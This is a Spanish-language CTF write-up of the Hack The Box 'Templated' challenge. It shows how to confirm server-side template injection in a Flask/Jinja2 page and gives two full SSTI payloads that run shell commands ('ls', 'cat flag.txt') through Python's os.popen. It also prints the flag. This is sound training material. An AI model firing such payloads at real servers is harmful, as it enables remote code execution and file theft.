---
title: Templated HTB
date: 2023-04-19
type: challenge
author: naibu3
---

#web #flask #jinja2

# Templated HTB

Es uno de los challenges de la sección de *web*.

## Reconocimiento

Al acceder por el navegador, vemos una página muy simple. Como podemos leer está creada en *flask/jinja2* ([[flask 1]]).

Si probamos a acceder a un recurso, por ejemplo a `http://ip/hola`, veremos que se muestra `'hola'` en la página. Si probamos con `{{7*7}}`, se renderiza un `49`. Por tanto podemos suponer que existe una vulnerabilidad de [[SSTI]].

## Explotación

Para explotar dicha vuln tan solo debemos hacer una inyección de código [[python 1]] como la siguiente:

```url
http://ip/{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
```

Lo que nos listará los recursos del directorio actual, done vemos un archivo `flag.txt`. Así que los listamos con otra inyección:

```url
http://ip/{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat flag.txt").read()}}{%endif%}{% endfor %}
```

Y ya tenemos la flag (`HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}`). Enhorabuena! Has completado el reto!